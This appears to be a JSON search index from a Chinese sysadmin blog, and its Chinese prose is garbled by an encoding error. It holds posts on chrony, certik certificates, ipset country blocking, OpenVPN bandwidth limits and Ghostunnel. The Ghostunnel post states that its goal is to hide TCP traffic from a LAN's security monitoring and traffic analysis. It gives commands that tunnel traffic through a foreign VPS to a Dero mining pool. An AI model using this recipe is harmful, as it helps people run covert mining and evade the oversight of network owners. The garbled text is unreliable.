files.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003elogdir /var/log/chrony\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003elogchange 0.5\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Select which information is logged.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#log measurements statistics tracking rtc\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eé‡Œé¢æœ‰å¥½å‡ ä¸ªç»†èŠ‚ï¼Œä¸‹é¢é€ä¸€è§£é‡Šä¸€ä¸‹ï¼š\u003c/p\u003e","title":"Chronyçš„å‡ ä¸ªè¯¦ç»†é…ç½®ç»†èŠ‚"},{"content":"å¾ˆç°å®çš„é—®é¢˜ï¼Œå±€åŸŸç½‘å†…æœ‰æ€åŠ¿æ„ŸçŸ¥å’Œç½‘ç»œæµé‡åˆ†æï¼Œè¿™å¾ˆè®¨åŒï¼\né‚£ä¹ˆï¼Œå¦‚ä½•æŠŠæŸæ®µæµé‡éšè—èµ·æ¥ï¼Œè®©æ€åŠ¿æ„ŸçŸ¥æ— æ³•åˆ†æå‘¢ï¼Ÿ\nå‰ææ¡ä»¶ï¼Œä½ éœ€è¦æœ‰å›½å¤–çš„ä¸€å° VPS ä½œä¸ºå¤–æ´ï¼ŒæŠŠ TCP æµé‡é€šè¿‡ TLS åŠ å¯†é€åˆ°å›½å¤–çš„æœåŠ¡å™¨ï¼Œç„¶åå†è½¬å‘åˆ°æ­£ç¡®çš„ç›®æ ‡æœåŠ¡å™¨ä¸Šï¼Œè¿™æ ·å°±ä¸ä¼šè¢«äººè¿½è¸ªäº†ã€‚\nè¿™é‡Œæ¨è Ghostunnel ï¼Œè¿™æ˜¯ä¸ª Go çš„ç¨‹åºï¼Œåªæœ‰ä¸€ä¸ªæ‰§è¡Œæ–‡ä»¶ã€‚é…åˆ certik è¯ä¹¦ç”Ÿæˆï¼Œå°±å®Œç¾äº†ã€‚\né¡¹ç›®åœ°å€ï¼šhttps://github.com/ghostunnel/ghostunnel\né¦–å…ˆæˆ‘ä»¬ä½¿ç”¨ certik ç”Ÿæˆä¸‰ä¸ªè¯ä¹¦ï¼Œca.pem server.pem å’Œ client1.pem\nç„¶åghostunnelä»¥åŠä¸‰ä¸ªè¯ä¹¦æ–‡ä»¶éƒ½æ”¾åœ¨/usr/local/binä¸‹\nä¸€ã€åœ¨VPSä¸Šè¿è¡Œghostunnelæ¨¡å¼server /usr/local/bin/ghostunnel server --listen 0.0.0.0:9999 --target tr.dero.herominers.com:1117 --keystore server.pem --cacert ca.pem --allow-cn client1 --unsafe-target ä¸Šé¢ç›‘å¬äº†ç«¯å£0.0.0.0:9999ï¼ˆç›‘å¬0.0.0.0å¿…é¡»åŠ å‚æ•°\u0026ndash;unsafe-targetï¼‰ï¼Œè¿œç¨‹è½¬å‘åˆ°deroçš„çŸ¿æ± ç«¯å£1117ï¼Œåªå…è®¸éªŒè¯è¿‡çš„cn client1è¿æ¥ã€‚\näºŒã€åœ¨æœ¬åœ°æœºå™¨ä¸Šè¿è¡Œghostunnelæ¨¡å¼client /usr/local/bin/ghostunnel client --listen localhost:9999 --target 193.42.114.129:9999 --keystore client.pem --cacert ca.pem æœ¬åœ°ç›‘å¬localhost:9999ï¼Œæ‰€ä»¥ä¸ç”¨åŠ \u0026ndash;unsafe-targetå‚æ•°ï¼Œç„¶åè¿æ¥åˆ°è¿œç¨‹ vps æœåŠ¡å™¨ï¼Œipåœ°å€æ˜¯193.42.114.129ï¼Œç«¯å£æ˜¯9999\nè¿™æ ·å°±å®Œæˆäº†ã€‚å¯ä»¥æ”¾å¿ƒçš„å¯åŠ¨ç¨‹åºï¼Œè¿æ¥åˆ°æœ¬åœ°ç«¯å£localhost:9999ï¼ŒTCPæµé‡å°±ä¼šè¢«éšè—èµ·æ¥ï¼Œä¸ä¼šè¢«åˆ†æåˆ°.\n","permalink":"https://rendoumi.com/posts/20211019-ghostunnel/","summary":"\u003cp\u003eå¾ˆç°å®çš„é—®é¢˜ï¼Œå±€åŸŸç½‘å†…æœ‰æ€åŠ¿æ„ŸçŸ¥å’Œç½‘ç»œæµé‡åˆ†æï¼Œè¿™å¾ˆè®¨åŒï¼\u003c/p\u003e\n\u003cp\u003eé‚£ä¹ˆï¼Œå¦‚ä½•æŠŠæŸæ®µæµé‡éšè—èµ·æ¥ï¼Œè®©æ€åŠ¿æ„ŸçŸ¥æ— æ³•åˆ†æå‘¢ï¼Ÿ\u003c/p\u003e\n\u003cp\u003eå‰ææ¡ä»¶ï¼Œä½ éœ€è¦æœ‰å›½å¤–çš„ä¸€å° VPS ä½œä¸ºå¤–æ´ï¼ŒæŠŠ TCP æµé‡é€šè¿‡ TLS åŠ å¯†é€åˆ°å›½å¤–çš„æœåŠ¡å™¨ï¼Œç„¶åå†è½¬å‘åˆ°æ­£ç¡®çš„ç›®æ ‡æœåŠ¡å™¨ä¸Šï¼Œè¿™æ ·å°±ä¸ä¼šè¢«äººè¿½è¸ªäº†ã€‚\u003c/p\u003e\n\u003cp\u003eè¿™é‡Œæ¨è Ghostunnel  ï¼Œè¿™æ˜¯ä¸ª Go çš„ç¨‹åºï¼Œåªæœ‰ä¸€ä¸ªæ‰§è¡Œæ–‡ä»¶ã€‚é…åˆ certik è¯ä¹¦ç”Ÿæˆï¼Œå°±å®Œç¾äº†ã€‚\u003c/p\u003e\n\u003cp\u003eé¡¹ç›®åœ°å€ï¼šhttps://github.com/ghostunnel/ghostunnel\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆæˆ‘ä»¬ä½¿ç”¨ certik ç”Ÿæˆä¸‰ä¸ªè¯ä¹¦ï¼Œca.pem server.pem å’Œ client1.pem\u003c/p\u003e\n\u003cp\u003eç„¶åghostunnelä»¥åŠä¸‰ä¸ªè¯ä¹¦æ–‡ä»¶éƒ½æ”¾åœ¨/usr/local/binä¸‹\u003c/p\u003e\n\u003ch2 id=\"ä¸€åœ¨vpsä¸Šè¿è¡Œghostunnelæ¨¡å¼server\"\u003eä¸€ã€åœ¨VPSä¸Šè¿è¡Œghostunnelæ¨¡å¼server\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/usr/local/bin/ghostunnel server --listen 0.0.0.0:9999 --target tr.dero.herominers.com:1117 --keystore server.pem --cacert ca.pem --allow-cn client1 --unsafe-target\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä¸Šé¢ç›‘å¬äº†ç«¯å£0.0.0.0:9999ï¼ˆç›‘å¬0.0.0.0å¿…é¡»åŠ å‚æ•°\u0026ndash;unsafe-targetï¼‰ï¼Œè¿œç¨‹è½¬å‘åˆ°deroçš„çŸ¿æ± ç«¯å£1117ï¼Œåªå…è®¸éªŒè¯è¿‡çš„cn client1è¿æ¥ã€‚\u003c/p\u003e\n\u003ch2 id=\"äºŒåœ¨æœ¬åœ°æœºå™¨ä¸Šè¿è¡Œghostunnelæ¨¡å¼client\"\u003eäºŒã€åœ¨æœ¬åœ°æœºå™¨ä¸Šè¿è¡Œghostunnelæ¨¡å¼client\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/usr/local/bin/ghostunnel client --listen localhost:9999 --target 193.42.114.129:9999 --keystore client.pem --cacert ca.pem \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæœ¬åœ°ç›‘å¬localhost:9999ï¼Œæ‰€ä»¥ä¸ç”¨åŠ \u0026ndash;unsafe-targetå‚æ•°ï¼Œç„¶åè¿æ¥åˆ°è¿œç¨‹ vps æœåŠ¡å™¨ï¼Œipåœ°å€æ˜¯193.42.114.129ï¼Œç«¯å£æ˜¯9999\u003c/p\u003e\n\u003cp\u003eè¿™æ ·å°±å®Œæˆäº†ã€‚å¯ä»¥æ”¾å¿ƒçš„å¯åŠ¨ç¨‹åºï¼Œè¿æ¥åˆ°æœ¬åœ°ç«¯å£localhost:9999ï¼ŒTCPæµé‡å°±ä¼šè¢«éšè—èµ·æ¥ï¼Œä¸ä¼šè¢«åˆ†æåˆ°.\u003c/p\u003e","title":"ghostunnelä½¿ç”¨TLSåŠ å¯†TCPæµé‡"},{"content":"æˆ‘ä»¬ä¼šæœ‰å¾ˆå¤šæ—¶å€™éœ€è¦ç”¨åˆ°TLSè¯ä¹¦ï¼Œä¸€ä¸ªéå¸¸æ–¹ä¾¿ã€å°ä¼—çš„å·¥å…·å°±æ˜¯ certik ã€‚\nè¿™ä¸ªè½¯ä»¶çº¯ç”± Go ç»„æˆï¼Œå°±ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œä½¿ç”¨äº† etcd çš„ boltdb æ ¼å¼å­˜æ”¾æ‰€æœ‰çš„è¯ä¹¦ã€‚\nè½¯ä»¶åœ°å€ï¼šhttps://github.com/opencoff/certik\nä½¿ç”¨ï¼š\nä¸€ã€åˆå§‹åŒ–è¯ä¹¦åº“ ./certik -v tls.db init CA äºŒã€ç­¾å‘ä¸€å¼ serverè¯ä¹¦ #./certik -v tls.db server -i IP.ADDR.ES server.domain.name ./certik -v tls.db server -i 193.42.114.129 server ä¸Šé¢æˆ‘ä»¬ server çš„ ip æ˜¯193.42.114.129ï¼ŒåŸŸåç®€æ´èµ·è§å°±å« server äº† ã€‚\nä¸‰ã€ç­¾å‘ä¸€å¼ client1è¯ä¹¦ ./certik -v tls.db client client1 å››ã€æŸ¥çœ‹è¯ä¹¦åº“ ./certik -v tls.db list æˆ‘ä»¬å°±å¯ä»¥çœ‹åˆ°ä¸‰ä¸ªè¯ä¹¦äº†ï¼Œä¸€ä¸ª CA ï¼Œä¸€ä¸ª server ï¼Œä¸€ä¸ª client1\näº”ã€å¯¼å‡ºå„ä¸ªè¯ä¹¦ #å¯¼å‡ºCA ./certik -v tls.db export --root-ca #å¯¼å‡ºserver ./certik -v tls.db export server #å¯¼å‡ºclient1 ./certik -v tls.db export client1 ä»¥ä¸Šå°±å¯ä»¥å¾—åˆ°å„ä¸ªä¸œè¥¿äº†ã€‚\né‚£ä¹ˆæˆ‘ä»¬ gen å‡ºè¯ä¹¦åšä»€ä¹ˆç”¨å‘¢ï¼Ÿå½“ç„¶ç”¨ä½œ ghostunnel çš„éªŒè¯ç”¨\n","permalink":"https://rendoumi.com/posts/20211019-certik/","summary":"\u003cp\u003eæˆ‘ä»¬ä¼šæœ‰å¾ˆå¤šæ—¶å€™éœ€è¦ç”¨åˆ°TLSè¯ä¹¦ï¼Œä¸€ä¸ªéå¸¸æ–¹ä¾¿ã€å°ä¼—çš„å·¥å…·å°±æ˜¯ certik ã€‚\u003c/p\u003e\n\u003cp\u003eè¿™ä¸ªè½¯ä»¶çº¯ç”± Go ç»„æˆï¼Œå°±ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œä½¿ç”¨äº† etcd çš„ boltdb æ ¼å¼å­˜æ”¾æ‰€æœ‰çš„è¯ä¹¦ã€‚\u003c/p\u003e\n\u003cp\u003eè½¯ä»¶åœ°å€ï¼šhttps://github.com/opencoff/certik\u003c/p\u003e\n\u003cp\u003eä½¿ç”¨ï¼š\u003c/p\u003e\n\u003ch2 id=\"ä¸€åˆå§‹åŒ–è¯ä¹¦åº“\"\u003eä¸€ã€åˆå§‹åŒ–è¯ä¹¦åº“\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./certik -v tls.db init CA\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"äºŒç­¾å‘ä¸€å¼ serverè¯ä¹¦\"\u003eäºŒã€ç­¾å‘ä¸€å¼ serverè¯ä¹¦\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#./certik -v tls.db server -i IP.ADDR.ES server.domain.name\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./certik -v tls.db server -i 193.42.114.129 server\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä¸Šé¢æˆ‘ä»¬ server çš„ ip æ˜¯193.42.114.129ï¼ŒåŸŸåç®€æ´èµ·è§å°±å« server äº† ã€‚\u003c/p\u003e\n\u003ch2 id=\"ä¸‰ç­¾å‘ä¸€å¼ client1è¯ä¹¦\"\u003eä¸‰ã€ç­¾å‘ä¸€å¼ client1è¯ä¹¦\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./certik -v tls.db client client1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"å››æŸ¥çœ‹è¯ä¹¦åº“\"\u003eå››ã€æŸ¥çœ‹è¯ä¹¦åº“\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./certik -v tls.db list\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæˆ‘ä»¬å°±å¯ä»¥çœ‹åˆ°ä¸‰ä¸ªè¯ä¹¦äº†ï¼Œä¸€ä¸ª CA ï¼Œä¸€ä¸ª server ï¼Œä¸€ä¸ª client1\u003c/p\u003e\n\u003ch2 id=\"äº”å¯¼å‡ºå„ä¸ªè¯ä¹¦\"\u003eäº”ã€å¯¼å‡ºå„ä¸ªè¯ä¹¦\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#å¯¼å‡ºCA\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./certik -v tls.db \u003cspan class=\"nb\"\u003eexport\u003c/span\u003e --root-ca\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#å¯¼å‡ºserver\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./certik -v tls.db \u003cspan class=\"nb\"\u003eexport\u003c/span\u003e server\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#å¯¼å‡ºclient1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./certik -v tls.db \u003cspan class=\"nb\"\u003eexport\u003c/span\u003e client1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä»¥ä¸Šå°±å¯ä»¥å¾—åˆ°å„ä¸ªä¸œè¥¿äº†ã€‚\u003c/p\u003e","title":"Certik è¯ä¹¦ç­¾å‘è½¯ä»¶"},{"content":"ç°åœ¨å›½å†…éƒ½ç¦æ­¢æŒ–å¸ï¼Œä»€ä¹ˆå¸å®‰ã€ç«å¸ã€cnsparkä¹‹ç±»çš„éƒ½ä¸å…è®¸å›½å†… IP è®¿é—®äº†ã€‚\nå¦‚ä½•å®ç°çš„å‘¢ï¼Ÿ\né¦–å…ˆéœ€è¦å¾—åˆ°å›½å®¶IPæ®µï¼Œä¸‹è½½åœ°å€ï¼šhttp://www.ipdeny.com/ipblocks/ã€‚è¿™é‡Œä»¥æˆ‘ä»¬å›½å®¶ cn ä¸ºä¾‹\næ­¥éª¤å¦‚ä¸‹ï¼š\nä¸€ã€å®‰è£…ipset #Debian/Ubuntuç³»ç»Ÿ apt-get -y install ipset #CentOSç³»ç»Ÿ yum -y install ipset äºŒã€æ¸…ç©ºiptableè§„åˆ™ #é˜²æ­¢è®¾ç½®ä¸ç”Ÿæ•ˆï¼Œæ¸…ç©ºä¹‹å‰çš„é˜²ç«å¢™è§„åˆ™ iptables -P INPUT ACCEPT iptables -F ä¸‰ã€åˆ›å»ºipsetè§„åˆ™é›† #åˆ›å»ºä¸€ä¸ªåä¸ºcnipçš„è§„åˆ™ ipset -N cnip hash:net #ä¸‹è½½å›½å®¶IPæ®µï¼Œè¿™é‡Œä»¥ä¸­å›½ä¸ºä¾‹ wget -P . http://www.ipdeny.com/ipblocks/data/countries/cn.zone #å°†IPæ®µæ·»åŠ åˆ°cnipè§„åˆ™é›†ä¸­ for i in $(cat /root/cn.zone ); do ipset -A cnip $i; done å››ã€åˆ›å»ºiptableé»‘åå• #æ‰”é»‘åå• iptables -A INPUT -p tcp --dport 80 -m set --match-set cnip src -j DROP iptables -A INPUT -p tcp --dport 443 -m set --match-set cnip src -j DROP #ç„¶åæ”¾è¡Œå…¶ä»–çš„ iptables -P INPUT ACCEPT ","permalink":"https://rendoumi.com/posts/20211018-ipset_block_cn/","summary":"\u003cp\u003eç°åœ¨å›½å†…éƒ½ç¦æ­¢æŒ–å¸ï¼Œä»€ä¹ˆå¸å®‰ã€ç«å¸ã€cnsparkä¹‹ç±»çš„éƒ½ä¸å…è®¸å›½å†… IP è®¿é—®äº†ã€‚\u003c/p\u003e\n\u003cp\u003eå¦‚ä½•å®ç°çš„å‘¢ï¼Ÿ\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆéœ€è¦å¾—åˆ°å›½å®¶\u003ccode\u003eIP\u003c/code\u003eæ®µï¼Œä¸‹è½½åœ°å€ï¼šhttp://www.ipdeny.com/ipblocks/ã€‚è¿™é‡Œä»¥æˆ‘ä»¬å›½å®¶ cn ä¸ºä¾‹\u003c/p\u003e\n\u003cp\u003eæ­¥éª¤å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003ch2 id=\"ä¸€å®‰è£…ipset\"\u003eä¸€ã€å®‰è£…ipset\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#Debian/Ubuntuç³»ç»Ÿ\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapt-get -y install ipset\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#CentOSç³»ç»Ÿ\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum -y install ipset\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"äºŒæ¸…ç©ºiptableè§„åˆ™\"\u003eäºŒã€æ¸…ç©ºiptableè§„åˆ™\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#é˜²æ­¢è®¾ç½®ä¸ç”Ÿæ•ˆï¼Œæ¸…ç©ºä¹‹å‰çš„é˜²ç«å¢™è§„åˆ™\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eiptables -P INPUT ACCEPT\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eiptables -F\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"ä¸‰åˆ›å»ºipsetè§„åˆ™é›†\"\u003eä¸‰ã€åˆ›å»ºipsetè§„åˆ™é›†\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#åˆ›å»ºä¸€ä¸ªåä¸ºcnipçš„è§„åˆ™\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eipset -N cnip hash:net\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#ä¸‹è½½å›½å®¶IPæ®µï¼Œè¿™é‡Œä»¥ä¸­å›½ä¸ºä¾‹\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget -P . http://www.ipdeny.com/ipblocks/data/countries/cn.zone\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#å°†IPæ®µæ·»åŠ åˆ°cnipè§„åˆ™é›†ä¸­\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efor\u003c/span\u003e i in \u003cspan class=\"k\"\u003e$(\u003c/span\u003ecat /root/cn.zone \u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003edo\u003c/span\u003e ipset -A cnip \u003cspan class=\"nv\"\u003e$i\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"å››åˆ›å»ºiptableé»‘åå•\"\u003eå››ã€åˆ›å»ºiptableé»‘åå•\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#æ‰”é»‘åå•\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eiptables -A INPUT -p tcp --dport \u003cspan class=\"m\"\u003e80\u003c/span\u003e -m \u003cspan class=\"nb\"\u003eset\u003c/span\u003e --match-set cnip src -j DROP\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eiptables -A INPUT -p tcp --dport \u003cspan class=\"m\"\u003e443\u003c/span\u003e -m \u003cspan class=\"nb\"\u003eset\u003c/span\u003e --match-set cnip src -j DROP\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#ç„¶åæ”¾è¡Œå…¶ä»–çš„\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eiptables -P INPUT ACCEPT\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"ä½¿ç”¨IPSETå°æ‰æŸä¸ªå›½å®¶æ•´ä¸ªçš„è®¿é—®"},{"content":"å…¬å¸å®‰è£…äº† openvpn ï¼Œå¸¦æ¥æ–¹ä¾¿ï¼Œä½†æ˜¯ä¹Ÿæœ‰å¾ˆå¤šä¸ä¾¿çš„åœ°æ–¹ï¼Œæœºæˆ¿çš„æ€»å¸¦å®½å°±é‚£ä¹ˆå¤šã€‚\nå¾ˆå¤šäººå…±ç”¨ vpn çš„æ—¶å€™ï¼Œå°±ä¼šæŠ¢å å¸¦å®½ã€‚\né‚£ä¹ˆï¼Œæˆ‘ä»¬éœ€è¦é™åˆ¶ä¸€ä¸‹ï¼Œé™åˆ¶ openvpn æ‰€èƒ½ä½¿ç”¨çš„å¸¦å®½ï¼Œé¿å…æŠ¢å  WEB çš„å¸¦å®½\nåšæ³•å¦‚ä¸‹ï¼š\nç”±äºæˆ‘ä»¬ä¸æ˜¯è¦å•ç‹¬é™åˆ¶æŸä¸€ä¸ª openvpn ç”¨æˆ·ï¼Œè€Œæ˜¯é™åˆ¶æ•´ä½“ï¼Œæ‰€ä»¥ç®€å•ç”¨ TC å°±å¯ä»¥äº†\n#!/bin/sh tc qdisc del dev tun0 root tc qdisc add dev tun0 root handle 1: htb default 1 tc class add dev tun0 parent 1: classid 1:1 htb rate 30Mbit ceil 30Mbit è§£é‡Šä¸€ä¸‹ï¼š\næˆ‘ä»¬ openvpn å¯çš„æ˜¯ tun0 ï¼Œæ‰€ä»¥é™åˆ¶çš„å¯¹è±¡å°±æ˜¯ dev tun0 é¦–å…ˆç¬¬ä¸€è¡Œæ¸…é™¤ tun0 çš„æ ¹é˜Ÿåˆ— ç„¶åç¬¬äºŒè¡Œå»ºç«‹ tun0 çš„ root æ ¹é˜Ÿåˆ—ä¸º 1:0 htb ï¼Œç¼ºçœæ˜¯1:1çš„å­é˜Ÿåˆ— æœ€åä¸€è¡Œï¼Œç¬¬ä¸‰è¡Œå»ºç«‹ 1:1 çš„å­é˜Ÿåˆ—ï¼Œå¸¦å®½é™åˆ¶æ˜¯ 30Mbit ï¼Œæ³¨æ„è¿™é‡Œæ˜¯å¤§Bï¼Œå°±æ˜¯ç½‘ç»œæœ¯è¯­ä¸­çš„å¸¦å®½ï¼Œæ¢ç®—æˆå°bçš„è¯ï¼Œéœ€è¦é™¤ä»¥8 æ•ˆæœå¾ˆæ˜æ˜¾ï¼Œç›´æ¥è¢«é™åˆ¶ä½ï¼ˆ41å…†è€Œä¸æ˜¯30Mæ˜¯å› ä¸ºè¿™å°æœºå™¨æ˜¯è™šæœºï¼Œå®ä½“æœºä¸Šè¿˜æœ‰åˆ«çš„æµé‡ï¼‰ï¼š\n","permalink":"https://rendoumi.com/posts/20211018-openvpn_limit_bandwidth/","summary":"\u003cp\u003eå…¬å¸å®‰è£…äº† openvpn ï¼Œå¸¦æ¥æ–¹ä¾¿ï¼Œä½†æ˜¯ä¹Ÿæœ‰å¾ˆå¤šä¸ä¾¿çš„åœ°æ–¹ï¼Œæœºæˆ¿çš„æ€»å¸¦å®½å°±é‚£ä¹ˆå¤šã€‚\u003c/p\u003e\n\u003cp\u003eå¾ˆå¤šäººå…±ç”¨ vpn çš„æ—¶å€™ï¼Œå°±ä¼šæŠ¢å å¸¦å®½ã€‚\u003c/p\u003e\n\u003cp\u003eé‚£ä¹ˆï¼Œæˆ‘ä»¬éœ€è¦é™åˆ¶ä¸€ä¸‹ï¼Œé™åˆ¶ openvpn æ‰€èƒ½ä½¿ç”¨çš„å¸¦å®½ï¼Œé¿å…æŠ¢å  WEB çš„å¸¦å®½\u003c/p\u003e\n\u003cp\u003eåšæ³•å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cp\u003eç”±äºæˆ‘ä»¬ä¸æ˜¯è¦å•ç‹¬é™åˆ¶æŸä¸€ä¸ª openvpn 